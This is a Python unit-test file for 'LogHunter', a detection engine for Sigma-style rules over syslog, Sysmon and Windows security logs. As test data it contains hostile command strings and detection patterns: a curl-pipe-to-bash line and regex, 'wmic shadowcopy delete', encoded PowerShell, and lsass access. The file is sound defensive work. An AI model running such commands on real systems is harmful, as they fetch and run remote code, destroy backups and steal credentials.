"""LogHunter birim testleri (pytest ya da `python -m unittest` ile calisir)."""
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from loghunter import minyaml                       # noqa: E402
from loghunter.engine import Engine, parse_timestamp  # noqa: E402
from loghunter.parsers import parse_file             # noqa: E402
from loghunter.rules import Rule, load_rules, rule_from_dict  # noqa: E402

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
RULES = os.path.join(ROOT, "rules")
SAMPLES = os.path.join(ROOT, "samples")


def make_rule(detection, **kw) -> Rule:
    data = {"title": kw.pop("title", "test"), "id": "t-1", "detection": detection}
    data.update(kw)
    return rule_from_dict(data)


class TestMiniYaml(unittest.TestCase):
    def test_nested_and_lists(self):
        data = minyaml.loads(
            "a: 1\nb:\n  c: yes\n  d:\n    - x\n    - y\ne: 'hello # not comment'  # comment\n"
        )
        self.assertEqual(data["a"], 1)
        self.assertIs(data["b"]["c"], True)
        self.assertEqual(data["b"]["d"], ["x", "y"])
        self.assertEqual(data["e"], "hello # not comment")


class TestMatching(unittest.TestCase):
    def test_exact_and_case_insensitive(self):
        rule = make_rule({"selection": {"EventID": 4625}, "condition": "selection"})
        self.assertTrue(rule.matches({"EventID": 4625}))
        self.assertTrue(rule.matches({"eventid": "4625"}))
        self.assertFalse(rule.matches({"EventID": 4624}))

    def test_contains_and_list_or(self):
        rule = make_rule({"selection": {"CommandLine|contains": ["-enc", "-ec "]},
                          "condition": "selection"})
        self.assertTrue(rule.matches({"CommandLine": "powershell -EncodedCommand AAA"}))
        self.assertFalse(rule.matches({"CommandLine": "notepad.exe"}))

    def test_contains_all(self):
        rule = make_rule({"selection": {"CommandLine|contains|all": ["shadow", "delete"]},
                          "condition": "selection"})
        self.assertTrue(rule.matches({"CommandLine": "wmic shadowcopy delete"}))
        self.assertFalse(rule.matches({"CommandLine": "wmic shadowcopy list"}))

    def test_not_condition(self):
        rule = make_rule({
            "selection": {"TargetImage|endswith": "\\lsass.exe"},
            "filter": {"SourceImage|endswith": "\\MsMpEng.exe"},
            "condition": "selection and not filter",
        })
        self.assertTrue(rule.matches({"TargetImage": "C:\\W\\lsass.exe", "SourceImage": "x.exe"}))
        self.assertFalse(rule.matches({"TargetImage": "C:\\W\\lsass.exe",
                                       "SourceImage": "C:\\P\\MsMpEng.exe"}))

    def test_or_group_condition(self):
        rule = make_rule({
            "base": {"EventID": 1},
            "a": {"CommandLine|contains": "aaa"},
            "b": {"CommandLine|contains": "bbb"},
            "condition": "base and (a or b)",
        })
        self.assertTrue(rule.matches({"EventID": 1, "CommandLine": "xx bbb"}))
        self.assertFalse(rule.matches({"EventID": 1, "CommandLine": "ccc"}))
        self.assertFalse(rule.matches({"EventID": 2, "CommandLine": "aaa"}))

    def test_one_of_wildcard(self):
        rule = make_rule({"sel_a": {"x": 1}, "sel_b": {"y": 2}, "condition": "1 of sel_*"})
        self.assertTrue(rule.matches({"y": 2}))
        self.assertFalse(rule.matches({"z": 3}))

    def test_regex_modifier(self):
        rule = make_rule({"k": {"_raw|re": r"curl[^|]*\|\s*bash"}, "condition": "k"})
        self.assertTrue(rule.matches({"_raw": "curl http://x/y.sh | bash"}))
        self.assertFalse(rule.matches({"_raw": "curl http://x/y.sh -o y.sh"}))

    def test_numeric_modifier(self):
        rule = make_rule({"k": {"bytes|gt": 1000}, "condition": "k"})
        self.assertTrue(rule.matches({"bytes": "5000"}))
        self.assertFalse(rule.matches({"bytes": 10}))

    def test_logsource_filtering(self):
        rule = make_rule({"selection": {"a": 1}, "condition": "selection"},
                         logsource={"product": "windows"})
        self.assertTrue(rule.matches({"a": 1, "_product": "windows"}))
        self.assertFalse(rule.matches({"a": 1, "_product": "linux"}))


class TestParsers(unittest.TestCase):
    def test_syslog_extraction(self):
        events = list(parse_file(os.path.join(SAMPLES, "auth.log")))
        self.assertGreater(len(events), 5)
        failed = [e for e in events if e.get("event_type") == "ssh_failed_login"]
        self.assertTrue(failed)
        self.assertEqual(failed[0]["src_ip"], "45.155.205.233")

    def test_ndjson_flatten(self):
        events = list(parse_file(os.path.join(SAMPLES, "sysmon.json")))
        self.assertEqual(events[0]["EventID"], 1)
        self.assertEqual(events[0]["_service"], "sysmon")

    def test_json_array(self):
        events = list(parse_file(os.path.join(SAMPLES, "security.json")))
        self.assertEqual(events[0]["_service"], "security")


class TestEngine(unittest.TestCase):
    def setUp(self):
        self.rules = load_rules(RULES)

    def test_rules_load(self):
        self.assertGreaterEqual(len(self.rules), 10)
        for rule in self.rules:
            self.assertTrue(rule.title)
            self.assertTrue(rule.mitre, f"{rule.id} MITRE etiketi yok")

    def test_end_to_end_sysmon(self):
        events = list(parse_file(os.path.join(SAMPLES, "sysmon.json")))
        result = Engine(self.rules).run(events)
        titles = {a.rule_id for a in result.alerts}
        self.assertIn("win-ps-encoded-001", titles)
        self.assertIn("win-lolbin-002", titles)
        self.assertIn("win-lsass-003", titles)
        self.assertIn("win-shadow-006", titles)

    def test_defender_lsass_access_is_filtered(self):
        events = [e for e in parse_file(os.path.join(SAMPLES, "sysmon.json"))
                  if "MsMpEng" in str(e.get("SourceImage", ""))]
        self.assertEqual(len(events), 1)
        result = Engine(self.rules).run(events)
        self.assertEqual([a for a in result.alerts if a.rule_id == "win-lsass-003"], [])

    def test_threshold_bruteforce(self):
        events = list(parse_file(os.path.join(SAMPLES, "security.json")))
        result = Engine(self.rules).run(events)
        hits = [a for a in result.alerts if a.rule_id == "win-bruteforce-005"]
        self.assertEqual(len(hits), 1)
        self.assertGreaterEqual(hits[0].count, 5)

    def test_risk_score_range(self):
        events = list(parse_file(os.path.join(SAMPLES, "auth.log")))
        result = Engine(self.rules).run(events)
        self.assertTrue(0 <= result.risk_score <= 100)
        self.assertGreater(len(result.alerts), 0)

    def test_timestamp_parsing(self):
        self.assertIsNotNone(parse_timestamp({"UtcTime": "2026-07-28 09:14:02.113"}))
        self.assertIsNotNone(parse_timestamp({"TimeCreated": "2026-07-28T02:11:04"}))
        self.assertIsNone(parse_timestamp({"foo": "bar"}))


if __name__ == "__main__":
    unittest.main(verbosity=2)
